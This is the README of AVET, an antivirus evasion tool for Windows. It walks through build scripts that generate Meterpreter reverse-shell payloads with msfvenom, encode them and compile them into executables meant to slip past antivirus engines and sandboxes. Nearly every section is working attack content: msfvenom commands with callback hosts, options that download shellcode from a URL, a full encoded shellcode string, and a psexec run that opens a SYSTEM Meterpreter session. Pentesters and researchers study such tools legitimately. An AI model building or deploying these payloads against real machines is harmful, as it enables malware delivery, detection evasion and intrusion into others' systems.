AntiVirus Evasion Tool
======================

AVET is an AntiVirus Evasion Tool, which was developed for making life easier for pentesters and for experimenting with antivirus evasion techniques.
In version 1.2 new stuff was introduced, for a complete overview have a look at the CHANGELOG file.

For basics about antivirus evasion, AVET & more information have a look here: 
- https://govolution.wordpress.com/2017/07/27/paper-avet-blackhat-usa-2017/
- https://govolution.wordpress.com/2017/06/11/avet-video/
- https://govolutionde.files.wordpress.com/2014/05/avevasion_pentestmag.pdf
- https://deepsec.net/docs/Slides/2014/Why_Antivirus_Fails_-_Daniel_Sauder.pdf
- https://twitter.com/DanielX4v3r

What & Why:
- when running an exe file made with msfpayload & co, the exe file will often be recognized by the antivirus software
- avet is a antivirus evasion tool targeting windows machines with executable files
- assembly shellcodes can be used
- make_avet can be used for configuring the sourcecode
- with make_avet you can load ASCII encoded shellcodes from a textfile or from a webserver, further it is using an av evasion technique to avoid sandboxing and emulation
- call msf ASCII encoded shellcode as a parameter from cmd
- for ASCII encoding the shellcode the tool format.sh and sh_format are included
- this readme applies for Kali 2 (64bit) and tdm-gcc

How to install tdm-gcc with wine:
https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/


How to use make_avet and build scripts
--------------------------------------
Compile if needed, for example if you use a 32 bit system:
```
$ gcc -o make_avet make_avet.c
```

The purpose of make_avet is to preconfigure a definition file (defs.h) so that the source code can be compiled in the next step. This way the payload will be encoded as ASCII payload or with encoders from metasploit. You hardly can beat shikata-ga-nai.

Let's have a look at the options from make_avet, examples will be given below:
-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt

-f compile shellcode into .exe, needs filename of shellcode file

-u load and exec shellcode from url using internet explorer (url is compiled into executable)

-E use avets ASCII encryption, often do not has to be used
   Note: with -l -E is mandatory
   
-F use fopen sandbox evasion

-X compile for 64 bit

-p print debug information

-q quiet mode (hide windows)

-h help


Of course it is possible to run all commands step by step from command line. But it is strongly recommended to use build scripts or the avet_fabric.py.

The build scripts themselves are written so as they have to be called from within the avet directory:
```
root@kalidan:~/tools/avet# ./build/build_win32_meterpreter_rev_https_20xshikata.sh
```

Here are some explained examples for building the .exe files from the build directory. Please have a look at the other build scripts for further explanation.


Example 1
---------
In this example the evasion technique is simple. The shellcode is encoded with 20 rounds of 
shikata-ga-nai, often enough that does the trick (note: Now it might be more ;) ). This technique is pretty similar to a junk loop. Execute so much code that the AV engine breaks up execution and let the file pass.

```
#!/bin/bash          
# simple example script for building the .exe file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.128 lport=443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
# call make_avet, the sandbox escape is due to the many rounds of decoding the shellcode
./make_avet -f sc.txt
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
# cleanup
echo "" > defs.h
```

Example 2, 64bit payloads
-------------------------
Great to notice that still for 64bit payload no further evasion techniques has to be used. But -F should work here too.

```
#!/bin/bash          
# simple example script for building the .exe file
. build/global_win64.sh
# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt
# call make_avet, compile 
./make_avet -f scclean.txt -X -E
$win64_compiler -o pwn.exe avet.c
# cleanup
rm scclean.txt && echo "" > defs.h
```


Example 3
---------
Compile shellcode into the .exe file and use -F as evasion technique. Note that this example will work for most antivirus engines. Here -E is used for encoding the shellcode as ASCII.

```
#!/bin/bash          
# simple example script for building the .exe file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt
# call make_avet, the -f compiles the shellcode to the exe file, the -F is for the AV sandbox evasion, -E will encode the shellcode as ASCII
./make_avet -f scclean.txt -F -E
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
# cleanup
rm scclean.txt && echo "" > defs.h
```


Example 4, load from a file
---------------------------
Here the ASCII encoder is needed. The executable will load the payload from a text file, which is enough for most AV engines to let the payload execute.

```
#!/bin/bash          
# simple example script for building the .exe file that loads the payload from a given text file
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.116.132 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > thepayload.txt && rm sc.txt
# call make_avet, the -l compiles the filename into the .exe file 
./make_avet -l thepayload.exe -E
# compile to pwn.exe file
$win32_compiler -o pwn.exe avet.c
# cleanup
#echo "" > defs.h
# now you can call your programm with pwn.exe, thepayload.txt has to be in the same dir
```


Example 5, load with Internet Explorer
--------------------------------------
This is a bit tricky and might not work on the first shot. The executable will start Internet Explorer and download the ASCII encoded shellcode. Then the shellcode will be read from the cache directory and if found executed. This was tested with Windows 7 only.

```
#!/bin/bash          
# simple example script for building the .exe file
. build/global_win32.sh
# make meterpreter reverse payload, encoded with shikata_ga_nai
# additionaly to the avet encoder, further encoding should be used
msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.105 lport=443 -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > sc.txt
# format the shellcode for make_avet
./format.sh sc.txt > scclean.txt && rm sc.txt
# call make_avet, compile 
./make_avet -E -u 192.168.2.105/scclean.txt
$win32_compiler -o pwn.exe avet.c
# cleanup
echo " " > defs.h
# now copy scclean.txt to your web root and start 
```


Example 6, call shellcode as a parameter
----------------------------------------
It is possible to load shellcode as a parameter from cmd like:
```
C:\> pwn.exe PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlzHOrgpwpEPapLIheeaIPrDLKRp00NkV26lnkCbUDlK0r4OMg0JtfEaKONLWLe1aldBTlWPo1hOVmFa8GZBJRsbRwLKPRVplKqZ7LnkRlB1CHhc2hS1Jq3alKf9Q0GqICnkG97hhcfZaYnkttlKfaJvuayoNLZaJoFm31JgehKPaeYf4CamHx7KSM5t2UzDbxlKBxFDFaKcE6lK6lpKlKshELWqKcLKeTNkFaHPni1Ta4dd3k1KaqBy2zF1ioM0qOQOpZlKR2XkLMQMphPn3UT4uPsXqgQypnQy1DcXBlqgUvFgioZuDqKkRs0SBssccc3XFZ66RYI7KO9EaCpS0jtCf3v3SXoKva30309xKtuPs07pfOabF8rlcopdG3VUrK0n07BMVYSQE2T8ROGEPOPLphP8e7du0iqj3osISqBR0grC2tCfroef1aRU1OblRMqzd1UaBx737D1OW1dpv9fV7pv0SXv7k9mOkvYokeniXFF32HEPEbM0MT63v3bsaGaCsfSXJKV5DnWKKOiENv1zgzaOE8opp3S0wpMY9p1z3460SZGorvU8CEBfMNOvkOyE1CpSaC2spVqxVMtF7hCK9oXUNekpCE5DU8OxGcc0EPaxStZPVUM0kOjupO45xMyx0LePEPWp1zspQxWpR0uPS0u8c030aPc0bs3X68i42sHeioiENs2sBsOyHgrwqxEPa0eP30v3V6cXuBofNiZByo8UmUIP448ONkFg5QO3NeKpT5Iuv8O3CojHrKYo9oyop1DyEbFNfQtvGHVNDqUafVDnubDpuhUPoKxpH5i2sf2JC0sc9ohUAA
```
An example makefile is: build/build_win32_meterpreter_rev_https_ASCIIMSF_cmd.sh


Example 7, use the "killswitch" sandbox evasion technique
---------------------------------------------------------
This technique is using the gethostbyname command. See help from make_avet, for an example please refer:
build/build_win32_meterpreter_rev_https_killswitch_shikata.sh


Example 8, quite mode
---------------------
With the quite mode the cmd window is hidden. For an example see:
build/build_win32_meterpreter_rev_https_fopen_shikata_quiet.sh


avet_fabric.py
--------------
avet_fabric is an assistant, that loads all build scripts in the build directory (name has to be build*.sh) and then lets the user edit the settings line by line. This is under huge development.

Example:
```
# ./avet_fabric.py 

                       .|        ,       +
             *         | |      ((             *
                       |'|       `    ._____
         +     ___    |  |   *        |.   |' .---"|
       _    .-'   '-. |  |     .--'|  ||   | _|    |
    .-'|  _.|  |    ||   '-__  |   |  |    ||      |
    |' | |.    |    ||       | |   |  |    ||      |
 ___|  '-'     '    ""       '-'   '-.'    '`      |____
jgs~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

AVET 1.2 Blackhat USA 2017 edition
by Daniel Sauder

avet_fabric.py is an assistant for building exe files with shellcode payloads for targeted attacks and antivirus evasion.

0: build_win32_meterpreter_rev_https_shikata_loadfile.sh
1: build_win32_meterpreter_rev_https_shikata_fopen.sh
2: build_win32_meterpreter_rev_https_shikata_load_ie_debug.sh
3: build_win32_shell_rev_tcp_shikata_fopen_kaspersky.sh
4: build_win32_meterpreter_rev_https_20xshikata.sh
5: build_win32_meterpreter_rev_https_shikata_load_ie.sh
6: build_win64_meterpreter_rev_tcp.sh
Input number of the script you want use and hit enter: 6

Now you can edit the build script line by line.

simple example script for building the .exe file
$ . build/global_win64.sh
make meterpreter reverse payload
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
format the shellcode for make_avet
$ ./format.sh sc.txt > scclean.txt && rm sc.txt
call make_avet, compile
$ ./make_avet -f scclean.txt -X -E
$ $win64_compiler -o pwn.exe avet.c
cleanup
$ rm scclean.txt && echo "" > defs.h

The following commands will be executed:
#/bin/bash
. build/global_win64.sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.132 lport=443 -f c --platform Windows > sc.txt
./format.sh sc.txt > scclean.txt && rm sc.txt
./make_avet -f scclean.txt -X -E
$win64_compiler -o pwn.exe avet.c
rm scclean.txt && echo "" > defs.h

Press enter to continue.

Building the output file...

Please stand by...

The output file should be placed in the current directory.

Bye...
```

AVET & metasploit psexec
------------------------
New in version 1.2 is the support for metasploits psexec module. The corresponding make file looks like:

```
#!/bin/bash          
# simple example script for building the .exe file
# for use with msf psexec module
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# make meterpreter bind payload, encoded 20 rounds with shikata_ga_nai
msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -i 20 -f c -a x86 --platform Windows > sc.txt
# call make_avetsvc, the sandbox escape is due to the many rounds of decoding the shellcode
./make_avetsvc -f sc.txt
# compile to pwn.exe file
$win32_compiler -o pwnsvc.exe avetsvc.c
# cleanup
echo "" > defs.h
```

And on the metasploit site:
```
msf exploit(psexec) > use exploit/windows/smb/psexec
msf exploit(psexec) > set EXE::custom /root/tools/ave/pwn.exe
EXE::custom => /root/tools/ave/pwn.exe
msf exploit(psexec) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(psexec) > set rhost 192.168.116.183
rhost => 192.168.116.183
msf exploit(psexec) > set smbuser dax
smbuser => dax
msf exploit(psexec) > set smbpass test123
smbpass => test123
msf exploit(psexec) > set lport 8443
lport => 8443
msf exploit(psexec) > run

[*] 192.168.116.183:445 - Connecting to the server...
[*] Started bind handler
[*] 192.168.116.183:445 - Authenticating to 192.168.116.183:445 as user 'dax'...
[*] Sending stage (957487 bytes) to 192.168.116.183
[*] 192.168.116.183:445 - Selecting native target
[*] 192.168.116.183:445 - Uploading payload...
[*] 192.168.116.183:445 - Using custom payload /root/tools/avepoc/a.exe, RHOST and RPORT settings will be ignored!
[*] 192.168.116.183:445 - Created \mzrCIOVg.exe...
[+] 192.168.116.183:445 - Service started successfully...
[*] 192.168.116.183:445 - Deleting \mzrCIOVg.exe...
[-] 192.168.116.183:445 - Delete of \mzrCIOVg.exe failed: The server responded with error: STATUS_CANNOT_DELETE (Command=6 WordCount=0)
[*] Exploit completed, but no session was created.
msf exploit(psexec) > [*] Meterpreter session 4 opened (192.168.116.142:33453 -> 192.168.116.183:8443) at 2017-05-27 18:47:23 +0200

msf exploit(psexec) > sessions

Active sessions
===============

Id Type Information Connection
-- ---- ----------- ----------
4 meterpreter x86/windows NT-AUTORIT_T\SYSTEM @ DAX-RYMZ48Z3EYO 192.168.116.142:33453 -> 192.168.116.183:8443 (192.168.116.183)

msf exploit(psexec) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer : DAX-RYMZ48Z3EYO
OS : Windows XP (Build 2600, Service Pack 3).
Architecture : x86
System Language : de_DE
Domain : ARBEITSGRUPPE
Logged On Users : 2
Meterpreter : x86/windows
```
